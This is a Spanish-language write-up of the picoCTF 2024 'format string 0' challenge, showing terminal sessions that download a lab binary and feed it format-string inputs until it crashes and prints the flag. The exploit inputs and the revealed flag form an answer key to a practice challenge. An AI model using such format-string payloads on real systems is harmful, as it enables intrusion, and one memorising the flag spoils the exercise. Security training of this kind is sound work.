## Objetivo
Can you use your knowledge of format strings to make the customers happy?Download the binary [here](https://artifacts.picoctf.net/c_mimas/76/format-string-0).Download the source [here](https://artifacts.picoctf.net/c_mimas/76/format-string-0.c).

Additional details will be available after launching your challenge instance.

## Pistas

## Solución
1. Ir a terminal de Linux y hacer lo siguiente:
```
kali@kali:~/Documents/picoCTF/picoCTF2024$ mkdir format_string_0

kali@kali:~/Documents/picoCTF/picoCTF2024$ cd format_string_0/

kali@kali:~/Documents/picoCTF/picoCTF2024/format_string_0$ wget https://artifacts.picoctf.net/c_mimas/76/format-string-0
--2024-03-16 19:24:42--  https://artifacts.picoctf.net/c_mimas/76/format-string-0
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 3.161.225.62, 3.161.225.60, 3.161.225.3, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|3.161.225.62|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16632 (16K) [application/octet-stream]
Saving to: ‘format-string-0’

format-string-0                                            100%[=======================================================================================================================================>]  16.24K  --.-KB/s    in 0s      

2024-03-16 19:24:43 (195 MB/s) - ‘format-string-0’ saved [16632/16632]

kali@kali:~/Documents/picoCTF/picoCTF2024/format_string_0$ wget https://artifacts.picoctf.net/c_mimas/76/format-string-0.c
--2024-03-16 19:24:50--  https://artifacts.picoctf.net/c_mimas/76/format-string-0.c
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 3.161.225.62, 3.161.225.60, 3.161.225.3, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|3.161.225.62|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2784 (2.7K) [application/octet-stream]
Saving to: ‘format-string-0.c’

format-string-0.c                                          100%[=======================================================================================================================================>]   2.72K  --.-KB/s    in 0s      

2024-03-16 19:24:50 (64.9 MB/s) - ‘format-string-0.c’ saved [2784/2784]

kali@kali:~/Documents/picoCTF/picoCTF2024/format_string_0$ file format-string-0
format-string-0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=73480d84a806aebddd86602609fcab2052c8fa13, for GNU/Linux 3.2.0, not stripped

kali@kali:~/Documents/picoCTF/picoCTF2024/format_string_0$ ls -l
total 24
-rw-r--r-- 1 kali kali 16632 Mar 11 20:10 format-string-0
-rw-r--r-- 1 kali kali  2784 Mar 11 20:10 format-string-0.c

kali@kali:~/Documents/picoCTF/picoCTF2024/format_string_0$ chmod +x format-string-0

kali@kali:~/Documents/picoCTF/picoCTF2024/format_string_0$ ./format-string-0
Please create 'flag.txt' in this directory with your own debugging flag.

kali@kali:~/Documents/picoCTF/picoCTF2024/format_string_0$ echo "bandera{123}" > flag.txt

kali@kali:~/Documents/picoCTF/picoCTF2024/format_string_0$ ./format-string-0
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak

bandera{123}
```
2. Ir a picoCTF e iniciar la instancia, copiar el comando y regresar a la consola de Linux.
```
kali@kali:~/Documents/picoCTF/picoCTF2024/format_string_0$ nc mimas.picoctf.net 59968
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese 
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}

```
3.La bandera es :
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}
## Notas adicionales

## Referencias
